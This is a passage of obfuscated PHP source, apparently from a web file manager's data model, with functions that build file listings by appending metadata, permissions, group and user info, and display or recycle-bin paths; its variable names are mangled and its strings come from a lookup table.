$É¤‰·½×[85] : $É¤‰·½×[86]; $Îšğ˜®Î[$•íÔëŠ][] = $’¢£´¡; } unset($Îšğ˜®Î[$É¤‰·½×[456]]); } protected function _listAppendMeta(&$Š‘…ŒªÖ, $¿úš‡) { $®Ÿ»‰—Ä =& $_SERVER[±³—úê]; $ªÔ¶’¥ = array($®Ÿ»‰—Ä[502] => array($®Ÿ»‰—Ä[503], $¿úš‡)); $…ÓÉß‘ì = Model($®Ÿ»‰—Ä[546])->field($®Ÿ»‰—Ä[547])->where($ªÔ¶’¥)->select(); if (!$…ÓÉß‘ì) { return; } $›–Ë¶½õ = array($®Ÿ»‰—Ä[548], $®Ÿ»‰—Ä[549], $®Ÿ»‰—Ä[528]); $¤µå…ÜÛ = array(); foreach ($…ÓÉß‘ì as $™¸üÄãŒ) { if (!isset($¤µå…ÜÛ[$™¸üÄãŒ[$®Ÿ»‰—Ä[193]]])) { $¤µå…ÜÛ[$™¸üÄãŒ[$®Ÿ»‰—Ä[193]]] = array(); } if (in_array($™¸üÄãŒ[$®Ÿ»‰—Ä[97]], $›–Ë¶½õ)) { continue; } $¤µå…ÜÛ[$™¸üÄãŒ[$®Ÿ»‰—Ä[193]]][$™¸üÄãŒ[$®Ÿ»‰—Ä[97]]] = $™¸üÄãŒ[$®Ÿ»‰—Ä[461]]; } foreach ($Š‘…ŒªÖ as &$ÓıŠ­•«) { $ÓıŠ­•«[$®Ÿ»‰—Ä[550]] = !1; if (isset($¤µå…ÜÛ[$ÓıŠ­•«[$®Ÿ»‰—Ä[193]]])) { $ÓıŠ­•«[$®Ÿ»‰—Ä[550]] = $¤µå…ÜÛ[$ÓıŠ­•«[$®Ÿ»‰—Ä[193]]]; } if ($this->fileIsLock($ÓıŠ­•«) && $ÓıŠ­•«[$®Ÿ»‰—Ä[498]]) { $Š‹¬í‡ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÓıŠ­•«[$®Ÿ»‰—Ä[498]][$®Ÿ»‰—Ä[499]] = AuthModel::authDisable($ÓıŠ­•«[$®Ÿ»‰—Ä[498]][$®Ÿ»‰—Ä[499]], $Š‹¬í‡); $ÓıŠ­•«[$®Ÿ»‰—Ä[498]][$®Ÿ»‰—Ä[551]][$®Ÿ»‰—Ä[498]] = $ÓıŠ­•«[$®Ÿ»‰—Ä[498]][$®Ÿ»‰—Ä[499]]; } } unset($ÓıŠ­•«); } protected function _listAppendFileMeta(&$ÌÌ×‚­·, $Õ—‘ ¸è) { $µ³”«ÌŒ =& $_SERVER[±³—úê]; $ÍŞà‹Ñ× = array_to_keyvalue($ÌÌ×‚­·, $µ³”«ÌŒ[12], $µ³”«ÌŒ[552]); $ÍŞà‹Ñ× = array_filter(array_unique($ÍŞà‹Ñ×)); if (!$ÍŞà‹Ñ×) { return; } $½²ùùœ§ = array($µ³”«ÌŒ[553] => array($µ³”«ÌŒ[503], $ÍŞà‹Ñ×)); $˜ù«ÇèÆ = $µ³”«ÌŒ[554]; $ƒëÑã¤ñ = Model($µ³”«ÌŒ[555])->field($˜ù«ÇèÆ)->where($½²ùùœ§)->select(); $ƒëÑã¤ñ = array_to_keyvalue($ƒëÑã¤ñ, $µ³”«ÌŒ[552]); $şØÆÏ¡ß = Model($µ³”«ÌŒ[556])->field($µ³”«ÌŒ[557])->where($½²ùùœ§)->select(); $şØÆÏ¡ß = $şØÆÏ¡ß ? $şØÆÏ¡ß : array(); $¢‰¥†×ó = array(); foreach ($şØÆÏ¡ß as $¯Ò¡ïà) { if (!isset($¢‰¥†×ó[$¯Ò¡ïà[$µ³”«ÌŒ[552]]])) { $¢‰¥†×ó[$¯Ò¡ïà[$µ³”«ÌŒ[552]]] = array(); } $¢‰¥†×ó[$¯Ò¡ïà[$µ³”«ÌŒ[552]]][$¯Ò¡ïà[$µ³”«ÌŒ[97]]] = $¯Ò¡ïà[$µ³”«ÌŒ[461]]; } foreach ($ÌÌ×‚­· as &$»ôú±Ä¼) { $™á¯ı„ = $»ôú±Ä¼[$µ³”«ÌŒ[552]]; if (!$™á¯ı„ || !is_array($ƒëÑã¤ñ[$™á¯ı„])) { continue; } $“ÃÑçÓº = $ƒëÑã¤ñ[$™á¯ı„]; $“ÃÑçÓº[$µ³”«ÌŒ[79]] = $»ôú±Ä¼[$µ³”«ÌŒ[79]]; $“ÃÑçÓº[$µ³”«ÌŒ[32]] = $»ôú±Ä¼[$µ³”«ÌŒ[32]]; if (!$“ÃÑçÓº[$µ³”«ÌŒ[558]]) { Model($µ³”«ÌŒ[555])->fileMd5Check($“ÃÑçÓº); } if (!isset(self::$cacheFileInfo[$µ³”«ÌŒ[559] . $™á¯ı„])) { self::$cacheFileInfo[$µ³”«ÌŒ[559] . $™á¯ı„] = array_merge(array(), $“ÃÑçÓº); } unset($ƒëÑã¤ñ[$™á¯ı„][$µ³”«ÌŒ[87]]); $â£óá¦Ó = isset($¢‰¥†×ó[$™á¯ı„]) && is_array($¢‰¥†×ó[$™á¯ı„]) ? $¢‰¥†×ó[$™á¯ı„] : array(); $»ôú±Ä¼[$µ³”«ÌŒ[170]] = array_merge($â£óá¦Ó, $ƒëÑã¤ñ[$™á¯ı„]); if (isset($»ôú±Ä¼[$µ³”«ÌŒ[170]][$µ³”«ÌŒ[184]])) { $»ôú±Ä¼[$µ³”«ÌŒ[184]] = json_decode($»ôú±Ä¼[$µ³”«ÌŒ[170]][$µ³”«ÌŒ[184]], !0); unset($»ôú±Ä¼[$µ³”«ÌŒ[170]][$µ³”«ÌŒ[184]]); } } unset($»ôú±Ä¼); } protected function _listAppendSourceInfo(&$‡²úÖÅ, $¤¥°ÀÇ“) { $ºÕ®“§µ =& $_SERVER[±³—úê]; $©ùßß›ç = Model($ºÕ®“§µ[560])->listData(); $“ñ¢ÚÊ = Model($ºÕ®“§µ[510])->listData(); $ğ³ğö”¦ = Model($ºÕ®“§µ[500])->listData(); $æà…ÕÌæ = Model($ºÕ®“§µ[561])->listSimple(); $ÓÒ£¨±¡ = array_to_keyvalue($©ùßß›ç, $ºÕ®“§µ[486]); $ú‹üÌÜŠ = array_to_keyvalue_group($“ñ¢ÚÊ, $ºÕ®“§µ[87], $ºÕ®“§µ[511]); $ƒõ³ä = array_to_keyvalue($ğ³ğö”¦, $ºÕ®“§µ[87]); $±Ó¥ÁË¾ = array_to_keyvalue_group($æà…ÕÌæ, $ºÕ®“§µ[193]); foreach ($‡²úÖÅ as &$íÙŠÙå») { $íÙŠÙå»[$ºÕ®“§µ[90]] = array($ºÕ®“§µ[562] => 0, $ºÕ®“§µ[563] => 0, $ºÕ®“§µ[564] => 0); if (isset($ƒõ³ä[$íÙŠÙå»[$ºÕ®“§µ[193]]])) { $íÙŠÙå»[$ºÕ®“§µ[90]][$ºÕ®“§µ[565]] = 1; $íÙŠÙå»[$ºÕ®“§µ[90]][$ºÕ®“§µ[566]] = $ƒõ³ä[$íÙŠÙå»[$ºÕ®“§µ[193]]][$ºÕ®“§µ[32]]; } if ($ú‹üÌÜŠ && $ÓÒ£¨±¡ && isset($ú‹üÌÜŠ[$íÙŠÙå»[$ºÕ®“§µ[193]]])) { $íÙŠÙå»[$ºÕ®“§µ[90]][$ºÕ®“§µ[567]] = array(); foreach ($ú‹üÌÜŠ[$íÙŠÙå»[$ºÕ®“§µ[193]]] as $ØùÂÑÎ¿) { $›œÃùô = $ÓÒ£¨±¡[$ØùÂÑÎ¿]; $íÙŠÙå»[$ºÕ®“§µ[90]][$ºÕ®“§µ[567]][] = array($ºÕ®“§µ[568] => $›œÃùô[$ºÕ®“§µ[486]], $ºÕ®“§µ[505] => $›œÃùô[$ºÕ®“§µ[32]], $ºÕ®“§µ[569] => $›œÃùô[$ºÕ®“§µ[570]]); } } if ($±Ó¥ÁË¾ && isset($±Ó¥ÁË¾[$íÙŠÙå»[$ºÕ®“§µ[193]]])) { $íÙŠÙå»[$ºÕ®“§µ[90]][$ºÕ®“§µ[571]] = array(); foreach ($±Ó¥ÁË¾[$íÙŠÙå»[$ºÕ®“§µ[193]]] as $ÍÁ¾³è¾) { $¿ˆèúœì = $ºÕ®“§µ[572]; if ($ÍÁ¾³è¾[$ºÕ®“§µ[573]] == $ºÕ®“§µ[91]) { $¿ˆèúœì .= $ºÕ®“§µ[574]; } $íÙŠÙå»[$ºÕ®“§µ[90]][$ºÕ®“§µ[571]] = array_field_key($ÍÁ¾³è¾, explode($ºÕ®“§µ[50], $¿ˆèúœì)); } } } unset($íÙŠÙå»); return $‡²úÖÅ; } protected function _listAppendChildren(&$İú•Ë´ñ, $ç™Ä·Îí) { $òÂœ‡—‘ =& $_SERVER[±³—úê]; $Ÿ¯î™ªë = array(); $û¹“³Äà = array($òÂœ‡—‘[251] => 0, $òÂœ‡—‘[252] => 0); foreach ($İú•Ë´ñ as &$…¤‚·õ«) { if (!$…¤‚·õ«[$òÂœ‡—‘[496]]) { continue; } $Ÿ¯î™ªë[] = $…¤‚·õ«[$òÂœ‡—‘[193]]; } unset($…¤‚·õ«); if (!$Ÿ¯î™ªë) { return; } $ÂÂ‘ÏÓ = array($òÂœ‡—‘[192] => array($òÂœ‡—‘[7], $Ÿ¯î™ªë), $òÂœ‡—‘[516] => 0); $Ş İ„¢Ö = array($òÂœ‡—‘[192], $òÂœ‡—‘[496], $òÂœ‡—‘[575] => $òÂœ‡—‘[576]); $¼˜Ÿ¯„ = $this->field($Ş İ„¢Ö)->where($ÂÂ‘ÏÓ)->group($òÂœ‡—‘[577])->select(); $İöÄ°¤í = array(); foreach ($¼˜Ÿ¯„ as $ÁÉšÍÏ) { $ÜÁŒ²® = $ÁÉšÍÏ[$òÂœ‡—‘[192]]; $¥¨Ì­”Î = $ÁÉšÍÏ[$òÂœ‡—‘[496]] == $òÂœ‡—‘[91] ? $òÂœ‡—‘[252] : $òÂœ‡—‘[251]; if (!isset($İöÄ°¤í[$ÜÁŒ²®])) { $İöÄ°¤í[$ÜÁŒ²®] = array($òÂœ‡—‘[251] => 0, $òÂœ‡—‘[252] => 0); } $İöÄ°¤í[$ÜÁŒ²®][$¥¨Ì­”Î] += $ÁÉšÍÏ[$òÂœ‡—‘[576]]; } foreach ($İú•Ë´ñ as &$…¤‚·õ«) { if (!$…¤‚·õ«[$òÂœ‡—‘[496]]) { continue; } $ş óè“ã = is_array($İöÄ°¤í[$…¤‚·õ«[$òÂœ‡—‘[193]]]) ? $İöÄ°¤í[$…¤‚·õ«[$òÂœ‡—‘[193]]] : $û¹“³Äà; $…¤‚·õ«[$òÂœ‡—‘[252]] = $ş óè“ã[$òÂœ‡—‘[252]]; $…¤‚·õ«[$òÂœ‡—‘[251]] = $ş óè“ã[$òÂœ‡—‘[251]]; unset($…¤‚·õ«[$òÂœ‡—‘[497]]); } unset($…¤‚·õ«); } protected function _listAppendAuth(&$š’Ïïò) { $¦ÅŠÅØ‡ =& $_SERVER[±³—úê]; $¯Áø—°Œ = array(); foreach ($š’Ïïò as $¦±úúöâ) { if ($¦±úúöâ[$¦ÅŠÅØ‡[190]] == self::TYPE_GROUP) { $¯Áø—°Œ[] = $¦±úúöâ[$¦ÅŠÅØ‡[193]]; } } if (!$¯Áø—°Œ) { return; } $ıŸ³Ò¼ô = array_to_keyvalue($š’Ïïò, $¦ÅŠÅØ‡[193]); $µû©Üéş = Model($¦ÅŠÅØ‡[578])->getSourceList($¯Áø—°Œ, $ıŸ³Ò¼ô); $íÂåÕàŸ = KodUser::isRoot(); foreach ($š’Ïïò as $ÆÊ÷Ş¡˜ => &$¦±úúöâ) { $¦±úúöâ[$¦ÅŠÅØ‡[498]] = $µû©Üéş[$¦±úúöâ[$¦ÅŠÅØ‡[193]]]; if (!$¦±úúöâ[$¦ÅŠÅØ‡[498]] && $¦±úúöâ[$¦ÅŠÅØ‡[190]] == self::TYPE_GROUP) { $¦±úúöâ[$¦ÅŠÅØ‡[498]] = Action($¦ÅŠÅØ‡[579])->pathGroupAuthMake($¦±úúöâ[$¦ÅŠÅØ‡[580]]); if (!$¦±úúöâ[$¦ÅŠÅØ‡[498]] && !$íÂåÕàŸ) { $¦±úúöâ[$¦ÅŠÅØ‡[245]] = !1; $¦±úúöâ[$¦ÅŠÅØ‡[244]] = !1; } } if ($¦±úúöâ[$¦ÅŠÅØ‡[498]]) { $¦±úúöâ[$¦ÅŠÅØ‡[245]] = AuthModel::authCheckEdit($¦±úúöâ[$¦ÅŠÅØ‡[498]][$¦ÅŠÅØ‡[499]]); $¦±úúöâ[$¦ÅŠÅØ‡[244]] = AuthModel::authCheckView($¦±úúöâ[$¦ÅŠÅØ‡[498]][$¦ÅŠÅØ‡[499]]); } $this->groupPathDisplay($¦±úúöâ); } unset($¦±úúöâ); } public function _listAppendAuthSecret(&$•ò¬“§) { $‘Ôô†ğô =& $_SERVER[±³—úê]; if (Model($‘Ôô†ğô[519])->get($‘Ôô†ğô[581]) != $‘Ôô†ğô[91]) { return; } static $°§š¨ê§ = false; if (!$°§š¨ê§) { $ûƒÖöÍ = Model($‘Ôô†ğô[582]); $µßÎØÖ‰ = Model($‘Ôô†ğô[583]); $°§š¨ê§ = $µßÎØÖ‰->listData(); $°§š¨ê§ = array_to_keyvalue($°§š¨ê§, $‘Ôô†ğô[193]); $ô½İüÂ™ = json_decode(Model($‘Ôô†ğô[519])->get($‘Ôô†ğô[584]), !0); $ô½İüÂ™ = array_to_keyvalue($ô½İüÂ™, $‘Ôô†ğô[486]); foreach ($°§š¨ê§ as $Ì«Ã†À => $†üÅÂ·) { $†£Áµ¦ = $ô½İüÂ™[$†üÅÂ·[$‘Ôô†ğô[585]]]; if (!$†£Áµ¦) { $µßÎØÖ‰->remove($†üÅÂ·[$‘Ôô†ğô[486]]); unset($°§š¨ê§[$Ì«Ã†À]); continue; } $Áºá’»’ = $ûƒÖöÍ->listData($†£Áµ¦[$‘Ôô†ğô[498]]); if (!$Áºá’»’) { $µßÎØÖ‰->remove($†üÅÂ·[$‘Ôô†ğô[486]]); unset($°§š¨ê§[$Ì«Ã†À]); continue; } $†üÅÂ·[$‘Ôô†ğô[498]] = $Áºá’»’; $†üÅÂ·[$‘Ôô†ğô[586]] = $†£Áµ¦; $†üÅÂ·[$‘Ôô†ğô[587]] = Model($‘Ôô†ğô[588])->getInfoSimpleOuter($†üÅÂ·[$‘Ôô†ğô[538]]); $°§š¨ê§[$Ì«Ã†À] = $†üÅÂ·; } } $Ö‘ù·Èñ = USER_ID; $ºéÔó’â = array(); $ƒŞØ»ÁÃ = $this->_listAppendPath($ºéÔó’â, !0); foreach ($•ò¬“§ as $Ì«Ã†À => &$†üÅÂ·) { if (!is_array($†üÅÂ·[$‘Ôô†ğô[498]])) { continue; } if ($†üÅÂ·[$‘Ôô†ğô[190]] != $‘Ôô†ğô[589]) { continue; } if (isset($°§š¨ê§[$†üÅÂ·[$‘Ôô†ğô[193]]])) { $à£˜åõÈ = $°§š¨ê§[$†üÅÂ·[$‘Ôô†ğô[193]]]; if (!is_array($†üÅÂ·[$‘Ôô†ğô[550]])) { $†üÅÂ·[$‘Ôô†ğô[550]] = array(); } $†üÅÂ·[$‘Ôô†ğô[550]][$‘Ôô†ğô[590]] = $à£˜åõÈ[$‘Ôô†ğô[585]]; $†üÅÂ·[$‘Ôô†ğô[498]][$‘Ôô†ğô[591]] = $à£˜åõÈ; $†üÅÂ·[$‘Ôô†ğô[498]][$‘Ôô†ğô[592]] = $†üÅÂ·[$‘Ôô†ğô[593]]; $†üÅÂ·[$‘Ôô†ğô[498]][$‘Ôô†ğô[594]] = $‘Ôô†ğô[91]; if ($à£˜åõÈ[$‘Ôô†ğô[538]] != $Ö‘ù·Èñ) { $†üÅÂ·[$‘Ôô†ğô[498]][$‘Ôô†ğô[499]] = $†üÅÂ·[$‘Ôô†ğô[498]][$‘Ôô†ğô[499]] & $à£˜åõÈ[$‘Ôô†ğô[498]][$‘Ôô†ğô[498]]; } continue; } $İ”¬– = $this->parentLevelArray($†üÅÂ·[$‘Ôô†ğô[595]]); $ş ¯óµï = array_reverse($İ”¬–); foreach ($ş ¯óµï as $Å£†ƒó¡ => $§¾ÇšõÜ) { if (!isset($°§š¨ê§[$§¾ÇšõÜ])) { continue; } $à£˜åõÈ = $°§š¨ê§[$§¾ÇšõÜ]; $†üÅÂ·[$‘Ôô†ğô[498]][$‘Ôô†ğô[591]] = $à£˜åõÈ; if ($à£˜åõÈ[$‘Ôô†ğô[538]] != $Ö‘ù·Èñ) { $†üÅÂ·[$‘Ôô†ğô[498]][$‘Ôô†ğô[499]] = $†üÅÂ·[$‘Ôô†ğô[498]][$‘Ôô†ğô[499]] & $à£˜åõÈ[$‘Ôô†ğô[498]][$‘Ôô†ğô[498]]; } $»‡Ÿª = $‘Ôô†ğô[12]; $æäÉæ‰™ = count($İ”¬–) - $Å£†ƒó¡; for ($£î‹šıÁ = 0; $£î‹šıÁ < $æäÉæ‰™; $£î‹šıÁ++) { if (!isset($ƒŞØ»ÁÃ[$İ”¬–[$£î‹šıÁ]])) { $»‡Ÿª = $‘Ôô†ğô[12]; break; } $»‡Ÿª = $»‡Ÿª . rtrim($ƒŞØ»ÁÃ[$İ”¬–[$£î‹šıÁ]], $‘Ôô†ğô[8]) . $‘Ôô†ğô[8]; } $†üÅÂ·[$‘Ôô†ğô[498]][$‘Ôô†ğô[592]] = rtrim($»‡Ÿª, $‘Ôô†ğô[8]) . $‘Ôô†ğô[8]; break; } } unset($†üÅÂ·); } public function groupPathDisplay(&$·Ÿâ¡¥) { $ÁÕ…¨Ÿ– =& $_SERVER[±³—úê]; if ($·Ÿâ¡¥[$ÁÕ…¨Ÿ–[190]] != self::TYPE_GROUP) { return; } $©Ùº¯Ä = Model($ÁÕ…¨Ÿ–[596])->getInfo($·Ÿâ¡¥[$ÁÕ…¨Ÿ–[580]]); $éÚáÒŠù = $this->parentLevelArray($©Ùº¯Ä[$ÁÕ…¨Ÿ–[595]]); $¾¼¤²” = $ÁÕ…¨Ÿ–[12]; foreach ($éÚáÒŠù as $°Ù¥Î´) { $òí‡«Ş = Model($ÁÕ…¨Ÿ–[596])->getInfo($°Ù¥Î´); $¾¼¤²” .= $òí‡«Ş[$ÁÕ…¨Ÿ–[90]][$ÁÕ…¨Ÿ–[193]] . $ÁÕ…¨Ÿ–[50]; } $·Ÿâ¡¥[$ÁÕ…¨Ÿ–[597]] = $©Ùº¯Ä[$ÁÕ…¨Ÿ–[192]]; $·Ÿâ¡¥[$ÁÕ…¨Ÿ–[598]] = $©Ùº¯Ä[$ÁÕ…¨Ÿ–[595]]; $·Ÿâ¡¥[$ÁÕ…¨Ÿ–[599]] = $©Ùº¯Ä[$ÁÕ…¨Ÿ–[600]]; $·Ÿâ¡¥[$ÁÕ…¨Ÿ–[601]] = $¾¼¤²” . $©Ùº¯Ä[$ÁÕ…¨Ÿ–[90]][$ÁÕ…¨Ÿ–[193]]; } protected function _listAppendPath(&$‰ãºƒª, $ƒø¢¥ÍÊ = false) { $½„¦šØÓ =& $_SERVER[±³—úê]; static $¥æÉ¿³ = array(); $¡ÁäÂÈƒ = array(); $ñ£Ô·¹ñ = array(); if ($ƒø¢¥ÍÊ) { return $¥æÉ¿³; } foreach ($‰ãºƒª as &$Âƒ£Ğ˜ğ) { $ô·Ê‰ş‘ = $Âƒ£Ğ˜ğ[$½„¦šØÓ[193]]; if ($Âƒ£Ğ˜ğ[$½„¦šØÓ[496]] == $½„¦šØÓ[91] && $Âƒ£Ğ˜ğ[$½„¦šØÓ[192]] != 0) { $¥æÉ¿³[$ô·Ê‰ş‘] = $Âƒ£Ğ˜ğ[$½„¦šØÓ[32]]; } if ($Âƒ£Ğ˜ğ[$½„¦šØÓ[496]] == $½„¦šØÓ[91] && $Âƒ£Ğ˜ğ[$½„¦šØÓ[192]] == 0) { $¥æÉ¿³[$ô·Ê‰ş‘] = $this->_listAppendPathRoot($Âƒ£Ğ˜ğ, array()); } if (isset($ñ£Ô·¹ñ[$Âƒ£Ğ˜ğ[$½„¦šØÓ[595]]])) { continue; } $ñ£Ô·¹ñ[$Âƒ£Ğ˜ğ[$½„¦šØÓ[595]]] = !0; $Ÿ—¥¥Ô = $this->parentLevelArray($Âƒ£Ğ˜ğ[$½„¦šØÓ[595]]); foreach ($Ÿ—¥¥Ô as $ú ê±¥ => $”Œ˜²ë) { if (isset($¥æÉ¿³[$”Œ˜²ë])) { continue; } if ($ú ê±¥ == 0) { $¥æÉ¿³[$”Œ˜²ë] = $this->_listAppendPathRoot($Âƒ£Ğ˜ğ, $Ÿ—¥¥Ô); } if ($ú ê±¥ != 0) { $¡ÁäÂÈƒ[] = $”Œ˜²ë; } } } unset($Âƒ£Ğ˜ğ); $¡ÁäÂÈƒ = array_unique($¡ÁäÂÈƒ); if (count($¡ÁäÂÈƒ) > 0) { $—äõÕşá = array($½„¦šØÓ[502] => array($½„¦šØÓ[503], $¡ÁäÂÈƒ)); if (count($¡ÁäÂÈƒ) == 1) { $†µ½¦ = $this->sourceInfo($¡ÁäÂÈƒ[0]); $ö•ëñÑ€ = is_array($†µ½¦) ? array($†µ½¦) : !1; } else { $ö•ëñÑ€ = $this->field($½„¦šØÓ[602])->where($—äõÕşá)->select(); } if (!$ö•ëñÑ€) { $ö•ëñÑ€ = array(); } foreach ($ö•ëñÑ€ as $øà«ªßŒ) { $¥æÉ¿³[$øà«ªßŒ[$½„¦šØÓ[193]]] = $øà«ªßŒ[$½„¦šØÓ[32]]; } } $µ¾©ëˆû = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $†¸€†¬› = array(); foreach ($‰ãºƒª as &$Âƒ£Ğ˜ğ) { $šÆçïß = $Âƒ£Ğ˜ğ[$½„¦šØÓ[595]]; $ˆ¯®ˆè› = $½„¦šØÓ[12]; if (isset($†¸€†¬›[$šÆçïß])) { $ˆ¯®ˆè› = $†¸€†¬›[$šÆçïß]; } else { $Ÿ—¥¥Ô = $this->parentLevelArray($Âƒ£Ğ˜ğ[$½„¦šØÓ[595]]); foreach ($Ÿ—¥¥Ô as $ú ê±¥ => $”Œ˜²ë) { if (isset($¥æÉ¿³[$”Œ˜²ë])) { $ˆ¯®ˆè› .= $¥æÉ¿³[$”Œ˜²ë] . $½„¦šØÓ[8]; } } $†¸€†¬›[$šÆçïß] = $ˆ¯®ˆè›; } $ˆ¯®ˆè› .= $Âƒ£Ğ˜ğ[$½„¦šØÓ[32]]; if ($Âƒ£Ğ˜ğ[$½„¦šØÓ[496]] == $½„¦šØÓ[91]) { $ˆ¯®ˆè› .= $½„¦šØÓ[8]; } $Âƒ£Ğ˜ğ[$½„¦šØÓ[593]] = str_replace($½„¦šØÓ[266], $½„¦šØÓ[8], $ˆ¯®ˆè›); if ($Âƒ£Ğ˜ğ[$½„¦šØÓ[192]] == $½„¦šØÓ[240]) { $Âƒ£Ğ˜ğ[$½„¦šØÓ[32]] = trim($¥æÉ¿³[$Âƒ£Ğ˜ğ[$½„¦šØÓ[193]]], $½„¦šØÓ[8]); $Âƒ£Ğ˜ğ[$½„¦šØÓ[593]] = $Âƒ£Ğ˜ğ[$½„¦šØÓ[32]] . $½„¦šØÓ[8]; } if (intval($Âƒ£Ğ˜ğ[$½„¦šØÓ[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Âƒ£Ğ˜ğ, $Ÿ—¥¥Ô, $µ¾©ëˆû); } } unset($Âƒ£Ğ˜ğ); return $‰ãºƒª; } private function _listAppendPathRecycle(&$å¦¢£³Š, $ûÆ¬¨£, $ë¢Ü½€½) { $Øôş¡¢ =& $_SERVER[±³—úê]; if (!in_array($ë¢Ü½€½, $ûÆ¬¨£) && $å¦¢£³Š[$Øôş¡¢[193]] != $ë¢Ü½€½) { return; } $•ú‡ ïı = explode($Øôş¡¢[8], trim($å¦¢£³Š[$Øôş¡¢[593]], $Øôş¡¢[8])); $˜ø´éŒè = implode($Øôş¡¢[8], array_slice($•ú‡ ïı, 2)); $å¦¢£³Š[$Øôş¡¢[593]] = $Øôş¡¢[8] . LNG($Øôş¡¢[603]) . $Øôş¡¢[8] . ltrim($˜ø´éŒè, $Øôş¡¢[8]); $å¦¢£³Š[$Øôş¡¢[595]] = $Øôş¡¢[604] . implode($Øôş¡¢[50], array_slice($ûÆ¬¨£, 1)) . $Øôş¡¢[50]; if ($å¦¢£³Š[$Øôş¡¢[193]] == $ë¢Ü½€½) { $å¦¢£³Š[$Øôş¡¢[595]] = $Øôş¡¢[604]; $å¦¢£³Š[$Øôş¡¢[192]] = $Øôş¡¢[240]; $å¦¢£³Š[$Øôş¡¢[32]] = LNG($Øôş¡¢[603]); } $å¦¢£³Š[$Øôş¡¢[605]] = $Øôş¡¢[606]; } protected function _listAppendPathRoot(&$¢â¿˜ò™, $ÉÒ¶„‘) { $Îƒ†µ‚ =& $_SERVER[±³—úê]; static $š­ÅéÁ = false; static $•ê§ã£ = false; $Ğ¥ÎÈÇØ = $Îƒ†µ‚[12]; if ($¢â¿˜ò™[$Îƒ†µ‚[190]] == self::TYPE_USER) { if ($¢â¿˜ò™[$Îƒ†µ‚[580]] == USER_ID) { $Ğ¥ÎÈÇØ = LNG($Îƒ†µ‚[607]); if ($š­ÅéÁ === !1) { $†ø€¬¬Î = Model($Îƒ†µ‚[608])->getInfoFull(USER_ID); $š­ÅéÁ = _get($†ø€¬¬Î, $Îƒ†µ‚[609], $Îƒ†µ‚[12]); } if ($•ê§ã£ === !1) { $†ø€¬¬Î = Model($Îƒ†µ‚[608])->getInfoFull(USER_ID); $•ê§ã£ = _get($†ø€¬¬Î, $Îƒ†µ‚[610], $Îƒ†µ‚[12]); } if ($ÉÒ¶„‘ && $ÉÒ¶„‘[0] == $š­ÅéÁ || !$ÉÒ¶„‘ && $¢â¿˜ò™[$Îƒ†µ‚[193]] == $š­ÅéÁ) { $Ğ¥ÎÈÇØ = LNG($Îƒ†µ‚[611]); $¢â¿˜ò™[$Îƒ†µ‚[612]] = $Îƒ†µ‚[613]; } if ($ÉÒ¶„‘ && $ÉÒ¶„‘[0] == $•ê§ã£ || !$ÉÒ¶„‘ && $¢â¿˜ò™[$Îƒ†µ‚[193]] == $•ê§ã£) { $Ğ¥ÎÈÇØ = $Ğ¥ÎÈÇØ . $Îƒ†µ‚[614] . LNG($Îƒ†µ‚[615]); } if (!$ÉÒ¶„‘) { $¢â¿˜ò™[$Îƒ†µ‚[32]] = $Ğ¥ÎÈÇØ; } } else { $†ø€¬¬Î = Model($Îƒ†µ‚[608])->getInfoFull($¢â¿˜ò™[$Îƒ†µ‚[580]]); $æ®¡›Ü† = _get($†ø€¬¬Î, $Îƒ†µ‚[610], $Îƒ†µ‚[12]); $¢â¿˜ò™[$Îƒ†µ‚[616]] = Model($Îƒ†µ‚[588])->getInfoSimpleOuter($¢â¿˜ò™[$Îƒ†µ‚[580]]); $Ğ¥ÎÈÇØ = LNG($Îƒ†µ‚[617]) . $Îƒ†µ‚[176] . $¢â¿˜ò™[$Îƒ†µ‚[616]][$Îƒ†µ‚[32]] . $Îƒ†µ‚[178]; if ($ÉÒ¶„‘ && $ÉÒ¶„‘[0] == $æ®¡›Ü† || !$ÉÒ¶„‘ && $¢â¿˜ò™[$Îƒ†µ‚[193]] == $æ®¡›Ü†) { $Ğ¥ÎÈÇØ = LNG($Îƒ†µ‚[617]) . $Îƒ†µ‚[618] . $¢â¿˜ò™[$Îƒ†µ‚[616]][$Îƒ†µ‚[32]] . $Îƒ†µ‚[614] . LNG($Îƒ†µ‚[615]) . $Îƒ†µ‚[178]; } } } else { if ($¢â¿˜ò™[$Îƒ†µ‚[190]] == self::TYPE_GROUP) { $¯šº—¥¹ = Model($Îƒ†µ‚[596])->getInfoSimple($¢â¿˜ò™[$Îƒ†µ‚[580]]); $Ğ¥ÎÈÇØ = $¯šº—¥¹[$Îƒ†µ‚[32]]; } else { if ($¢â¿˜ò™[$Îƒ†µ‚[190]] == self::TYPE_SYSTEM) { $Ğ¥ÎÈÇØ = $Îƒ†µ‚[619]; } } } $Ğ¥ÎÈÇØ = $Ğ¥ÎÈÇØ ? $Îƒ†µ‚[8] . $Ğ¥ÎÈÇØ . $Îƒ†µ‚[8] : $Îƒ†µ‚[8]; return $Ğ¥ÎÈÇØ; } protected function _listAppendUser(&$İ ¨’ğ”) { $ı¦œ­Ú· =& $_SERVER[±³—úê]; $º†²ó¨ = array_to_keyvalue($İ ¨’ğ”, $ı¦œ­Ú·[12], $ı¦œ­Ú·[538]); $ÈŸ®³Êñ = array_to_keyvalue($İ ¨’ğ”, $ı¦œ­Ú·[12], $ı¦œ­Ú·[540]); $‹¡ŒñÆ¬ = array_merge($º†²ó¨, $ÈŸ®³Êñ); $®ì€Øø¾ = Model($ı¦œ­Ú·[608])->userListInfo($‹¡ŒñÆ¬); foreach ($İ ¨’ğ” as &$æ§¢Ô) { $Ô³±ÇÏñ = $æ§¢Ô[$ı¦œ­Ú·[538]]; $æ§¢Ô[$ı¦œ­Ú·[538]] = $®ì€Øø¾[$Ô³±ÇÏñ] ? $®ì€Øø¾[$Ô³±ÇÏñ] : !1; $Ô³±ÇÏñ = $æ§¢Ô[$ı¦œ­Ú·[540]]; $æ§¢Ô[$ı¦œ­Ú·[540]] = $®ì€Øø¾[$Ô³±ÇÏñ] ? $®ì€Øø¾[$Ô³±ÇÏñ] : !1; if (_get($æ§¢Ô, $ı¦œ­Ú·[620], 0)) { $Æ‹ú¤€ = $GLOBALS[$ı¦œ­Ú·[6]][$ı¦œ­Ú·[92]][$ı¦œ­Ú·[621]]; if ($æ§¢Ô[$ı¦œ­Ú·[550]][$ı¦œ­Ú·[622]] <= time() - $Æ‹ú¤€) { $this->metaSet($æ§¢Ô[$ı¦œ­Ú·[193]], $ı¦œ­Ú·[623], null); 